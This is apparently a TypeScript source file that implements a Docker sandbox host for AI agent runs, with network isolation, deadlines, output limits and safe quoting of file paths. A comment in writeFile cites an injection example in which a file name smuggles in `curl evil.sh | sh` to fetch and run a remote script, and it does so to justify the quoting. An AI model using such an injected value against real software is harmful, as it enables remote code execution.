import { describeBytes, FactoryError } from '@factory/shared';
import { OUTPUT_LIMIT_EXIT_CODE, TIMEOUT_EXIT_CODE } from '../engines/limits';
import { BoundedText, DEFAULT_CAPTURE_BYTES, DEFAULT_MAX_OUTPUT_BYTES } from './capture';
import { HARDENING_ARGS } from './hardening';
import { type ContainerLabels, labelArgs } from './labels';
import { quoteOne } from './shell';
import { resolveShell } from './shell-path';
import { annotateUnreachable } from './unreachable';

/**
 * The container host, behind one interface. The Runner is the only component
 * with rights here (research.md D5), and putting the boundary in an interface
 * means the lifecycle logic is testable without a daemon.
 */

export interface ContainerSpec {
  image: string;
  /**
   * Ceilings from the workspace settings (FR-085). Upper bounds on what a run
   * may consume, never minimums: an execution host that offers fixed
   * allocations gives the largest that fits WITHIN these, and refuses to
   * create a sandbox at all when none does (002 FR-005, FR-009).
   */
  cpu: number;
  memoryMb: number;
  /** Not quantised: enforced exactly, by the host itself (002 FR-009a, FR-010). */
  wallClockMinutes: number;
  /**
   * Whether the sandbox keeps its network once it has been prepared (FR-085).
   *
   * Recorded on the spec, but NOT applied at creation: the repository is
   * cloned from inside the container, so a container created with no network
   * cannot be prepared at all. `startRunWorkspace` clones first and then calls
   * `disconnectNetwork` when this is `false`, which is the point at which a
   * sandbox stops being able to send anything out — before any step runs.
   */
  network: boolean;
  /** Credentials arrive as environment, never as files (FR-083). */
  env: Record<string, string>;
  workdir: string;
  /**
   * Container ports to publish on the host's loopback interface (003 FR-006).
   *
   * Loopback only, never every interface: a launched project is arbitrary
   * code from a branch, reachable by whoever can reach the machine, and that
   * should be the person who pressed the button. The host port is chosen by
   * Docker and read back with `address`, so two launches cannot collide.
   */
  publish?: number[];
  /**
   * What the container is marked with, so it can be traced to what it was
   * made for and found when it cannot be — see `labels.ts`.
   */
  labels?: ContainerLabels;
}

export interface ExecResult {
  exitCode: number;
  stdout: string;
  stderr: string;
}

export interface ExecOptions {
  cwd?: string;
  env?: Record<string, string>;
  timeoutMs?: number;
  /** Called as output arrives, so the live log is live (FR-076). */
  onOutput?: (stream: 'stdout' | 'stderr', text: string) => void;
  /**
   * How much of each stream the RESULT keeps: its beginning and its end, with
   * a line between saying how much was left out. `onOutput` sees all of it
   * whatever this says. Absent, `DEFAULT_CAPTURE_BYTES`; a caller that needs a
   * whole file back says how large a file it can be (`capture.ts`).
   */
  captureBytes?: number;
  /**
   * The most either stream may print before the command is stopped, reported
   * as `OUTPUT_LIMIT_EXIT_CODE`. Absent, `DEFAULT_MAX_OUTPUT_BYTES`.
   */
  maxOutputBytes?: number;
}

export interface ContainerHost {
  /**
   * Whether this host can take a sandbox off the network at all.
   *
   * A container can be disconnected; a process on the machine it runs on
   * cannot. Where it cannot, the workspace's "no network while code is
   * written" setting is not applied and the run says so, rather than being
   * refused for asking something no run here could ever be granted.
   * Absent means yes, which is what every host but the process host is.
   */
  readonly isolates?: boolean;
  /**
   * Which shell the sandbox's tools are named for.
   *
   * The Claude CLI offers `Bash` on a POSIX machine and `PowerShell` on
   * Windows, and a model asked to run a command reaches for whichever its
   * platform presents. An agent's permitted tools are configured by a person
   * who should not have to know which of the two an execution host runs, so
   * the host says, and the invocation is built for it. Absent means POSIX,
   * which every container is.
   */
  readonly shell?: 'posix' | 'windows';
  create(spec: ContainerSpec): Promise<string>;
  /**
   * Takes charge of a sandbox this process did not create — one that
   * outlived a restart of the runner. Resolves when the sandbox is there and
   * usable; throws `sandbox_lost` when it is not, and the caller builds a new
   * one. Absent means every sandbox this host knows is in memory only.
   */
  adopt?(containerId: string, spec: ContainerSpec): Promise<void>;
  /**
   * Stops everything still running in a sandbox, except what keeps the
   * sandbox itself alive, and says how many things it stopped.
   *
   * Called on two occasions. After a restart, when a sandbox is adopted: the
   * runner's death killed the `docker exec` CLIENT of the step that was
   * running, not the agent inside the container, which went on working —
   * and spending — with nothing recording it, while the restarted runner
   * started the step again beside it: two agents in one workspace, one of
   * them invisible. And at shutdown, for every run in flight, so that no
   * agent works headless for however long the restart takes. Absent means
   * the host has nothing that could still be running.
   */
  quiesce?(containerId: string): Promise<{ stopped: number }>;
  exec(containerId: string, argv: string[], options?: ExecOptions): Promise<ExecResult>;
  /**
   * Runs one command behind a wall, over the same workspace.
   *
   * For the hosts whose sandbox is not itself a wall. The process host runs a
   * step as an ordinary process on a developer's machine, where a command can
   * reach the whole account — which is how an agent ending its own dev server
   * ended the runner supervising it. A step whose agent may run commands asks
   * for this instead, and gets a fresh container with the run's workspace
   * mounted in it; the workspace is unchanged, so the step before and the step
   * after still read what it wrote.
   *
   * Absent means the host's ordinary `exec` is already isolated, which is
   * true of the Docker host and of every hosted deployment. Callers fall back
   * to `exec` rather than refusing: a run on a machine with no Docker is a
   * run that works, with the guard in `guard.ts` as its remaining protection.
   */
  execIsolated?(containerId: string, argv: string[], options?: ExecOptions): Promise<ExecResult>;
  writeFile(containerId: string, path: string, content: string): Promise<void>;
  readFile(containerId: string, path: string): Promise<string | null>;
  /** Null when the path does not exist. Size distinguishes empty from absent. */
  stat(containerId: string, path: string): Promise<{ size: number } | null>;
  /**
   * Where a published container port can be reached from the host, as
   * `host:port`, or null when the port was not published (003 FR-006).
   */
  address(containerId: string, port: number): Promise<string | null>;
  /**
   * Cuts the container off from every network it is attached to.
   *
   * A sandbox has to reach the internet exactly once — to clone the
   * repository — and the workspace's setting is about what happens AFTER
   * that, while an agent is writing code. `--network none` at creation
   * expressed the second and prevented the first: the container came up with
   * no network and the clone inside it could not resolve a hostname, so with
   * the default setting no run could start at all.
   *
   * So the network is given, used, and then taken away. It must actually be
   * taken away: the caller treats a failure here as a failed start rather
   * than carrying on with a connected sandbox the workspace asked to isolate.
   */
  disconnectNetwork(containerId: string): Promise<void>;
  /**
   * Runs `work` with the sandbox's network back for the duration.
   *
   * A sandbox kept off the network while code is written still has to push
   * that code, and every git operation runs inside the sandbox — so with
   * the network taken away after the clone, no isolated run could ever push:
   * every step passed and the branch never reached the remote. The networks
   * `disconnectNetwork` removed are remembered and given back for exactly
   * one operation, then taken away again. A sandbox that was never cut off
   * just runs the work. Absent means the host has no wall to open.
   */
  withNetwork?<T>(containerId: string, work: () => Promise<T>): Promise<T>;
  destroy(containerId: string): Promise<void>;
}

/**
 * How long a Docker management command may take before the daemon is taken
 * to be wedged. `docker inspect`, `rm`, `network disconnect` and the like
 * answer in milliseconds; one that has not answered in half a minute is not
 * going to, and a loop waiting on it — or the shutdown waiting on the loop —
 * would otherwise wait for ever. Creation gets longer: it may pull an image.
 */
export const DOCKER_COMMAND_TIMEOUT_MS = 30_000;
export const DOCKER_CREATE_TIMEOUT_MS = 120_000;

/**
 * A file read, written or looked for through `docker exec`. Each is one small
 * command; a minute is a long time for it, and a daemon that has not answered
 * in one is not going to.
 */
export const DOCKER_FILE_TIMEOUT_MS = 60_000;

/**
 * For a command run in a sandbox whose caller named no deadline of its own —
 * writing a config file, a `git commit`. Every command that can legitimately
 * run long names one (a step's, a clone's, an install's); this is what stops
 * the ones that should not from being able to wait for ever.
 */
export const DEFAULT_EXEC_TIMEOUT_MS = 10 * 60_000;

/**
 * The deadlines the hosts apply, as one object so a test that has to see a
 * deadline fire can shorten it, rather than wait a minute for it.
 */
export const hostDeadlines = {
  command: DOCKER_COMMAND_TIMEOUT_MS,
  file: DOCKER_FILE_TIMEOUT_MS,
  exec: DEFAULT_EXEC_TIMEOUT_MS,
};

/**
 * The most of a file `readFile` brings back whole.
 *
 * What is read back is a document a step wrote, and the application keeps the
 * first half a megabyte of it (`MAX_DOCUMENT_BYTES`). Sixteen megabytes is far
 * more than that, and far less than an agent that wrote a file until the disk
 * was full — which `cat` would otherwise have carried into the runner's memory
 * in full. Past it the text comes back with its middle left out; past four
 * times it, the read is stopped.
 */
const MAX_READ_BYTES = 16 * 1024 * 1024;

/** What `docker rm` says when there is nothing to remove, which is the outcome asked for. */
const ALREADY_GONE = /No such container|removal of container .* is already in progress/i;

/** Null when a removal succeeded or the container was already gone; otherwise why not. */
export function removalFailed(result: ExecResult): string | null {
  if (result.exitCode === 0) return null;
  if (ALREADY_GONE.test(result.stderr)) return null;
  return result.stderr.trim() || `docker rm exited ${result.exitCode}`;
}

/** Shells out to the Docker CLI. One fresh container per run, never reused. */
export const dockerHost: ContainerHost = {
  async create(spec) {
    const argv = [
      'run',
      '--detach',
      // Gone when it stops. The container's command is the `sleep` that is
      // its wall-clock ceiling, and when that ends the container has nothing
      // left to say; keeping the exited container around only kept its
      // writable layer on disk, for a runner that might no longer be there
      // to `rm` it. Every read of a stopped sandbox already treated it as
      // lost (`assertContainerAlive`), so nothing distinguishes an exited
      // container from a removed one — except the disk (002 FR-010, FR-022).
      '--rm',
      ...labelArgs(spec.labels),
      '--user',
      // Non-root: an agent runs arbitrary code against a customer repository.
      '1000:1000',
      // And nothing a non-root process could become — see `hardening.ts`.
      ...HARDENING_ARGS,
      '--cpus',
      String(spec.cpu),
      '--memory',
      `${spec.memoryMb}m`,
      '--workdir',
      spec.workdir,
      // Deliberately NOT `--network none` when the workspace wants isolation:
      // the repository is cloned from inside this container, which needs a
      // network to do it. `disconnectNetwork` takes it away once the clone is
      // done — see the note on that method.
      // `127.0.0.1::<port>` — loopback, and a host port Docker picks.
      ...(spec.publish ?? []).flatMap((port) => ['--publish', `127.0.0.1::${port}`]),
      ...Object.keys(spec.env).flatMap((key) => ['--env', key]),
      spec.image,
      'sleep',
      String(spec.wallClockMinutes * 60),
    ];
    const result = await run('docker', argv, {
      env: spec.env,
      timeoutMs: DOCKER_CREATE_TIMEOUT_MS,
    });
    if (result.exitCode !== 0) {
      throw new FactoryError('sandbox_lost', 'could not create the sandbox', {
        detail: result.stderr.trim(),
      });
    }
    return result.stdout.trim();
  },

  async adopt(containerId) {
    // A container is Docker's to keep, so adopting one is asking whether it
    // is still running.
    await assertContainerAlive(containerId, 'the workspace');
  },

  async quiesce(containerId) {
    // Every process in the container but PID 1 — the `sleep` that is the
    // sandbox's lifetime — and the shell doing the killing. Read from /proc
    // rather than `ps`, which the slim image does not have; a zombie is
    // skipped, because it is already dead and counting it would report an
    // agent that was not there. `kill -9 -1` was tried and does not do this
    // portably from dash. The count is what was alive, so the log can say
    // what a restart found.
    const result = await run('docker', ['exec', containerId, 'sh', '-c', QUIESCE_SCRIPT], {
      timeoutMs: hostDeadlines.command,
    });
    if (result.exitCode !== 0) {
      throw new FactoryError('sandbox_lost', 'could not stop what was running in the sandbox', {
        detail: result.stderr.trim(),
      });
    }
    const stopped = Number(result.stdout.trim());
    return { stopped: Number.isFinite(stopped) ? stopped : 0 };
  },

  async disconnectNetwork(containerId) {
    // Every network it is on, not just the default one: a machine whose Docker
    // is configured with another default would otherwise keep its connection.
    const attached = await run(
      'docker',
      [
        'inspect',
        '--format',
        '{{range $name, $_ := .NetworkSettings.Networks}}{{$name}} {{end}}',
        containerId,
      ],
      { timeoutMs: hostDeadlines.command },
    );
    if (attached.exitCode !== 0) {
      throw new FactoryError('sandbox_lost', 'could not read the sandbox’s networks', {
        detail: attached.stderr.trim(),
      });
    }
    const networks = attached.stdout.trim().split(/\s+/).filter(Boolean);
    for (const network of networks) {
      const result = await run('docker', ['network', 'disconnect', network, containerId], {
        timeoutMs: hostDeadlines.command,
      });
      if (result.exitCode !== 0) {
        throw new FactoryError('sandbox_lost', `could not disconnect the sandbox from ${network}`, {
          detail: result.stderr.trim(),
        });
      }
    }
    // Remembered, so `withNetwork` can give back exactly what was taken.
    if (networks.length > 0) disconnectedNetworks.set(containerId, networks);
  },

  async withNetwork<T>(containerId: string, work: () => Promise<T>): Promise<T> {
    const networks = disconnectedNetworks.get(containerId);
    // Never cut off — or cut off by a runner that has since restarted, whose
    // memory this is not; a replacement built by this process is remembered.
    // Either way there is nothing to open here.
    if (!networks || networks.length === 0) return work();
    for (const network of networks) {
      const result = await run('docker', ['network', 'connect', network, containerId], {
        timeoutMs: hostDeadlines.command,
      });
      if (result.exitCode !== 0 && !/already exists in network/i.test(result.stderr)) {
        throw new FactoryError('sandbox_lost', `could not reconnect the sandbox to ${network}`, {
          detail: result.stderr.trim(),
        });
      }
    }
    let outcome: { ok: true; value: T } | { ok: false; error: unknown };
    try {
      outcome = { ok: true, value: await work() };
    } catch (error) {
      outcome = { ok: false, error };
    }
    // Taken away again whatever the work did. A failure here is a sandbox
    // left connected that the workspace asked not to have, so it is thrown
    // rather than logged — ahead of whatever the work itself threw.
    for (const network of networks) {
      const result = await run('docker', ['network', 'disconnect', network, containerId], {
        timeoutMs: hostDeadlines.command,
      });
      if (result.exitCode !== 0 && !/is not connected/i.test(result.stderr)) {
        throw new FactoryError('sandbox_lost', `could not disconnect the sandbox from ${network}`, {
          detail: result.stderr.trim(),
        });
      }
    }
    if (!outcome.ok) throw outcome.error;
    return outcome.value;
  },

  async exec(containerId, argv, options) {
    const env = options?.env ?? {};
    const docker = [
      'exec',
      ...(options?.cwd ? ['--workdir', options.cwd] : []),
      ...Object.keys(env).flatMap((key) => ['--env', key]),
      containerId,
      ...argv,
    ];
    const result = await run('docker', docker, {
      env,
      ...options,
      timeoutMs: options?.timeoutMs ?? hostDeadlines.exec,
    });
    if (result.exitCode === TIMEOUT_EXIT_CODE || result.exitCode === OUTPUT_LIMIT_EXIT_CODE) {
      // The deadline — or the output limit — killed the `docker exec` CLIENT.
      // The process inside the container — the agent, still working, still
      // spending, still printing — is untouched by that, so it is stopped
      // here: the step has already been recorded as stopped, and an agent
      // working on after that is one nobody is paying attention to (FR-080).
      await dockerHost.quiesce?.(containerId).catch(() => ({ stopped: 0 }));
    }
    // A failed command that could not reach something says so in its own
    // output, as one line a person can act on (FR-013). It adds a sentence and
    // never changes an outcome — see `unreachable.ts`.
    return result.exitCode === 0
      ? result
      : { ...result, stderr: annotateUnreachable(result.stderr, result.stdout) };
  },

  async writeFile(containerId, path, content) {
    // `path` is data — a step's required documents are typed into the pipeline
    // builder, so an unquoted interpolation here would let a document named
    // `a'; curl evil.sh | sh; '.md` run whatever it liked (FR-015).
    //
    // The parent directory is made first, as the process host makes it: a
    // document named `docs/spec.md` in a repository that has no `docs` yet is
    // an ordinary thing to ask for, and `cat` alone answered it with
    // "Directory nonexistent".
    const parent = path.slice(0, path.lastIndexOf('/')) || '/';
    const result = await run(
      'docker',
      [
        'exec',
        '-i',
        containerId,
        'sh',
        '-c',
        `mkdir -p ${quoteOne(parent)} && cat > ${quoteOne(path)}`,
      ],
      { stdin: content, timeoutMs: hostDeadlines.file },
    );
    if (result.exitCode !== 0) {
      throw new FactoryError('sandbox_lost', `could not write ${path}`, {
        detail: result.stderr.trim(),
      });
    }
  },

  async readFile(containerId, path) {
    const result = await run('docker', ['exec', containerId, 'cat', path], {
      captureBytes: MAX_READ_BYTES,
      maxOutputBytes: MAX_READ_BYTES * 4,
      timeoutMs: hostDeadlines.file,
    });
    if (result.exitCode === 0) return result.stdout;
    // A read that never answered is not a file that is not there. Both leave
    // `docker exec` failing, and the second is asked about below; this one is
    // the daemon, and is reported as what it is, so the run waits for it.
    if (result.exitCode === TIMEOUT_EXIT_CODE) throw unanswered(path);
    // A missing document and a lost sandbox are different answers, and this
    // used to give the same one for both (F2). The consequence was specific:
    // a step whose sandbox died mid-run reported its required document as not
    // produced, so the run failed for the wrong reason and a retry looked
    // pointless. `docker exec` fails for either cause, so the container has to
    // be asked which it was.
    await assertContainerAlive(containerId, path);
    return null;
  },

  async stat(containerId, path) {
    const result = await run(
      'docker',
      [
        'exec',
        containerId,
        'sh',
        '-c',
        // Same reason as writeFile: this path came from a person (FR-015).
        `test -f ${quoteOne(path)} && wc -c < ${quoteOne(path)}`,
      ],
      { timeoutMs: hostDeadlines.file },
    );
    if (result.exitCode === 0) {
      const size = Number(result.stdout.trim());
      return Number.isFinite(size) ? { size } : null;
    }
    if (result.exitCode === TIMEOUT_EXIT_CODE) throw unanswered(path);
    // `test -f` exits 1 for a missing path, which is indistinguishable from
    // `docker exec` failing because there is no container. Same question,
    // same answer as readFile (F3).
    await assertContainerAlive(containerId, path);
    return null;
  },

  async address(containerId, port) {
    const result = await run('docker', ['port', containerId, `${port}/tcp`], {
      timeoutMs: hostDeadlines.command,
    });
    if (result.exitCode !== 0) return null;
    // Docker prints one line per bound address, e.g. `127.0.0.1:49153`, and
    // on some hosts a second for `[::1]`. The loopback IPv4 one is the one a
    // browser on this machine reaches.
    const line = result.stdout
      .split('\n')
      .map((entry) => entry.trim())
      .find((entry) => entry.startsWith('127.0.0.1:'));
    return line ?? null;
  },

  async destroy(containerId) {
    // Checked, where it used to be assumed. A removal that failed — the
    // daemon restarting, the socket's permission gone, the command hanging —
    // resolved like a success: "sandbox released" was logged, the run's
    // record deleted, and the container ran on with nothing left that knew
    // its name. A container already gone is the outcome asked for, and is
    // not a failure.
    const result = await run('docker', ['rm', '--force', '--volumes', containerId], {
      timeoutMs: hostDeadlines.command,
    });
    const failed = removalFailed(result);
    if (failed) {
      throw new FactoryError('sandbox_lost', 'could not remove the sandbox', { detail: failed });
    }
    disconnectedNetworks.delete(containerId);
  },
};

/** Which networks `disconnectNetwork` took from which sandbox, for `withNetwork`. */
const disconnectedNetworks = new Map<string, string[]>();

/** See `dockerHost.quiesce`. Prints how many live processes it signalled. */
export const QUIESCE_SCRIPT = [
  'n=0',
  'for d in /proc/[0-9]*; do',
  '  p=$(basename "$d")',
  '  [ "$p" = 1 ] && continue',
  '  [ "$p" = "$$" ] && continue',
  '  s=$(sed "s/.*) //" "$d/stat" 2>/dev/null | cut -d" " -f1)',
  '  [ "$s" = Z ] && continue',
  '  n=$((n+1))',
  '  kill -9 "$p" 2>/dev/null',
  'done',
  'echo $n',
].join('\n');

/** What a `docker exec` that hit its deadline is reported as: the sandbox is not answering. */
function unanswered(path: string): FactoryError {
  return new FactoryError(
    'sandbox_lost',
    `the sandbox did not answer within ${Math.round(hostDeadlines.file / 1000)} seconds, so ${path} could not be read`,
  );
}

/**
 * Throws `sandbox_lost` if the container is not running, and returns quietly if
 * it is (F2, F3).
 *
 * Called only on the failure path of a read. That path is not rare — asking
 * whether a step produced its required document is an ordinary absent read — so
 * this costs one extra `docker inspect` per missing file, which is a cheap
 * price for the distinction it buys: `null` means "that file is not there" and
 * never "there is nowhere to look". Which is the difference between a step that
 * failed to produce its document and a run that should be rebuilt from its last
 * commit by `withSandboxRecovery`.
 *
 * A container that has stopped for any reason counts as lost, including one
 * that exited on its own wall-clock `sleep`: from a caller's point of view
 * there is no sandbox either way.
 */
async function assertContainerAlive(containerId: string, path: string): Promise<void> {
  // Anything that stops us CONFIRMING the container is up counts as lost,
  // including the daemon itself being unreachable — `Bun.spawn` throws outright
  // when there is no `docker` to run at all. The conservative answer is the
  // right one here: recovery rebuilds the sandbox once and resumes from the
  // branch, which is correct if it really is gone and harmless if the read was
  // simply of a file that was never written.
  const state = await run('docker', ['inspect', '--format', '{{.State.Running}}', containerId], {
    timeoutMs: hostDeadlines.command,
  })
    .then((probe) => (probe.exitCode === 0 ? probe.stdout.trim() : probe.stderr.trim()))
    .catch((error) => (error instanceof Error ? error.message : String(error)));
  if (state !== 'true') {
    throw new FactoryError('sandbox_lost', `the sandbox is gone, so ${path} could not be read`, {
      detail: state,
    });
  }
}

/**
 * The longest delay `setTimeout` can hold: a 32-bit signed integer of
 * milliseconds, about 24.8 days.
 */
const MAX_TIMER_MS = 2 ** 31 - 1;

/**
 * A delay `setTimeout` will actually wait for.
 *
 * Over the 32-bit ceiling the delay does not saturate — it overflows and the
 * timer fires almost at once. A sandbox lifetime of 36015 minutes, which is
 * what an eight-step pipeline under a 4500-minute per-step ceiling asks for,
 * is 2160900000 ms: 13 million over the limit, and the timer that should
 * have removed the sandbox in 25 days removed it in 21 milliseconds — while
 * git was still cloning into it. The clone reported
 * `could not write config file .../.git/config: Permission denied`, because
 * the directory it was writing into had just been deleted underneath it, and
 * that was reported as a repository that could not be cloned.
 *
 * Clamping is safe: the expiry that matters is the recorded deadline, which
 * every use of a sandbox checks. The timer is only the thing that tidies up
 * a sandbox nobody is asking about, and one that tidies up after 24.8 days
 * instead of 25 is not a difference anything can observe.
 */
export function timerDelay(ms: number): number {
  // A duration that is not a number is not a reason to fire now. Both timers
  // this guards are destructive — one deletes a workspace, the other kills a
  // running step — so the safe reading of an unusable duration is "as late as
  // this can be scheduled", never "immediately".
  if (Number.isNaN(ms)) return MAX_TIMER_MS;
  if (ms < 0) return 0;
  return Math.min(ms, MAX_TIMER_MS);
}

/**
 * What the two streams' capture is told: how much the result keeps, how much
 * a stream may print before the command is stopped, and what to do then.
 * Shared by every host that runs a real process, so they agree.
 */
export function outputLimits(options: ExecOptions | undefined, onLimit: () => void) {
  return {
    keepBytes: options?.captureBytes ?? DEFAULT_CAPTURE_BYTES,
    maxBytes: options?.maxOutputBytes ?? DEFAULT_MAX_OUTPUT_BYTES,
    onLimit,
  };
}

/** The result of a command stopped for printing more than it may. */
export function floodResult(
  output: { stdout: string; stderr: string },
  options: ExecOptions | undefined,
): ExecResult {
  const limit = options?.maxOutputBytes ?? DEFAULT_MAX_OUTPUT_BYTES;
  return {
    exitCode: OUTPUT_LIMIT_EXIT_CODE,
    stdout: output.stdout,
    stderr:
      `${output.stderr}\nstopped after printing more than ${describeBytes(limit)} of output`.trim(),
  };
}

/**
 * Exported so the deadline can be proven against a real process. An agent's
 * time limit is only a limit if something enforces it (FR-080), and that
 * something is here.
 */
export async function run(
  command: string,
  argv: string[],
  options: { env?: Record<string, string>; stdin?: string } & ExecOptions = {},
): Promise<ExecResult> {
  // `sh` is not on the PATH on Windows, and the `bash` that is belongs to
  // WSL; the shell that comes with Git is the one every script here is for.
  const executable = command === 'sh' && process.platform === 'win32' ? resolveShell() : command;
  const proc = Bun.spawn([executable, ...argv], {
    env: { ...process.env, ...options.env },
    stdin: options.stdin ? new TextEncoder().encode(options.stdin) : 'ignore',
    stdout: 'pipe',
    stderr: 'pipe',
  });

  // An agent's time limit is only a limit if something enforces it (FR-080).
  // The deadline kills the process and reports the same code `timeout(1)`
  // uses, so the caller can tell a deadline from an ordinary failure.
  let killedAtDeadline = false;
  const deadline = options.timeoutMs
    ? setTimeout(() => {
        killedAtDeadline = true;
        proc.kill('SIGKILL');
      }, timerDelay(options.timeoutMs))
    : null;

  // And so is a limit on what it may print. A command that never stops
  // printing was a process that never stopped growing, and it took the
  // runner with it before any deadline could fire (`capture.ts`).
  let killedForOutput = false;
  const limits = outputLimits(options, () => {
    killedForOutput = true;
    proc.kill('SIGKILL');
  });

  try {
    const [stdout, stderr] = await Promise.all([
      drain(proc.stdout, (text) => options.onOutput?.('stdout', text), limits),
      drain(proc.stderr, (text) => options.onOutput?.('stderr', text), limits),
    ]);
    const exitCode = await proc.exited;
    if (killedForOutput) return floodResult({ stdout, stderr }, options);
    return killedAtDeadline
      ? {
          exitCode: TIMEOUT_EXIT_CODE,
          stdout,
          stderr: `${stderr}\nstopped after ${options.timeoutMs}ms`.trim(),
        }
      : { exitCode, stdout, stderr };
  } finally {
    if (deadline) clearTimeout(deadline);
  }
}

/**
 * Reads a stream to its end, telling `onChunk` everything as it arrives and
 * keeping only what `keepBytes` allows for the result (`capture.ts`). Past
 * `maxBytes` it calls `onLimit` — which is expected to stop the process — and
 * stops reading.
 */
export async function drain(
  stream: ReadableStream<Uint8Array>,
  onChunk?: (text: string) => void,
  options: { keepBytes?: number; maxBytes?: number; onLimit?: () => void } = {},
): Promise<string> {
  const decoder = new TextDecoder();
  const kept = new BoundedText(options.keepBytes ?? DEFAULT_CAPTURE_BYTES);
  let seen = 0;
  for await (const chunk of stream) {
    seen += chunk.byteLength;
    const text = decoder.decode(chunk, { stream: true });
    kept.add(text);
    onChunk?.(text);
    if (options.maxBytes !== undefined && seen > options.maxBytes) {
      options.onLimit?.();
      break;
    }
  }
  return kept.toString();
}
